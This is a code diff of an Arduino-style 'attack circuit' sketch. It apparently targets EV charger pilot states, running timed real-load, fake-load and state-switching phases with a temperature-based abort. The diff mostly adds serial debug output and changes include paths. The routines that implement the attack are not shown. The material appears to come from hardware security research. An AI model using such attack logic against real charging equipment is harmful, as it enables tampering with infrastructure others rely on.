@@ -1,8 +1,8 @@
 /*attack circuit*/
 
-#include <temperature.h>
-#include <fakeLoad.h>
-#include <stateSwitching.h>
+#include "attack/temperature.h"
+#include "attack/fakeLoad.h"
+#include "attack/stateSwitching.h"
 
 // ADC thresholds (0–1023, scaled to 0–5 V)
 const int STATE_A_MIN = 900;   // ~4.4–5.0 V
@@ -31,12 +31,15 @@ tempInit();
 stateSwitchingInit();
 
  Serial.begin(9600);
+ Serial.println("System Initialized");
 
 }
 
 //StateC detector
 bool isStateC() {
     int adcValue = analogRead(STATE_DET_PIN);
+  Serial.print("ADC Value: ");
+  Serial.println(adcValue);
     return (adcValue >= STATE_C_MIN && adcValue < STATE_B_MIN);
 }
 
@@ -68,6 +71,8 @@ void loop() {
 
  // Abort attack if charger leaves State C
   if (!isStateC()) {
+
+     Serial.println("Not connected to charger or not in State C. Aborting attack.");
   
     realLoad = false;
     fakeLoad = false;
@@ -76,6 +81,7 @@ void loop() {
     return;
   }
 
+Serial.println("Phase 1: REAL LOAD");
 realLoad = true;
 attackTimer = millis();
 while (realLoad && millis() - attackTimer < REALLOAD_TIME_MS) {
@@ -83,6 +89,9 @@ while (realLoad && millis() - attackTimer < REALLOAD_TIME_MS) {
   delay(5);
 }
 
+Serial.println("Real Load Phase Complete");
+
+Serial.println("Phase 2: FAKE LOAD");
   fakeLoad = true;
   attackTimer = millis();
   while (fakeLoad && millis() - attackTimer < FAKELOAD_TIME_MS) {
@@ -90,17 +99,22 @@ while (realLoad && millis() - attackTimer < REALLOAD_TIME_MS) {
     delay(5);
   }
 
+  Serial.println("Fake Load Phase Complete");
+
+  Serial.println("Phase 3: STATE SWITCHING");
   stateSwitching = true;
   attackTimer = millis();
   while (stateSwitching && millis() - attackTimer < SS_TIME_MS) {
     stateSwitchingOnly();
-    readTemperature();
+    float temp =readTemperature();
+    Serial.print("Temperature: ");
+    Serial.println(temp);
 
-    if(!isTemperatureSafe()) {
-      //Serial.println("Temperature threshold exceeded!");
+    if(!isTemperatureSafe(temp)) {
+      Serial.println("Temperature threshold exceeded!");
       break;
     }
-delay(5);
+delay(2000);
 
 }
 
